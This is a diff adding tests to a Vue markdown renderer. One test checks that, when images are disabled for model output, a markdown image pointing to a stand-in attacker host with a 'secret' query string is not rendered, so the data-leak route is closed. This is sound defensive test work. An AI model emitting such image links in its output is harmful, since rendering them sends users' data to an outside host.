@@ -104,4 +104,30 @@ describe('MarkdownRenderer', () => {
         const vueMarkdown = wrapper.findComponent({ name: 'VueMarkdown' })
         expect(vueMarkdown.props('source')).toBe('')
     })
+
+    it('disables markdown images when allowImages is false (model output)', async () => {
+        const MarkdownIt = (await import('markdown-it')).default
+        const wrapper = mount(MarkdownRenderer, {
+            props: { source: 'x', allowImages: false }
+        })
+        const plugins = wrapper.findComponent({ name: 'VueMarkdown' }).props('plugins')
+
+        const md = new MarkdownIt()
+        plugins.forEach(plugin => md.use(plugin))
+        const html = md.render('![leak](https://attacker.example/?q=secret)')
+
+        expect(html).not.toContain('<img')
+        expect(html).not.toContain('src="https://attacker.example')
+    })
+
+    it('keeps images by default', async () => {
+        const MarkdownIt = (await import('markdown-it')).default
+        const wrapper = mount(MarkdownRenderer, { props: { source: 'x' } })
+        const plugins = wrapper.findComponent({ name: 'VueMarkdown' }).props('plugins')
+
+        const md = new MarkdownIt()
+        plugins.forEach(plugin => md.use(plugin))
+
+        expect(md.render('![pic](https://example.com/a.png)')).toContain('<img')
+    })
 })
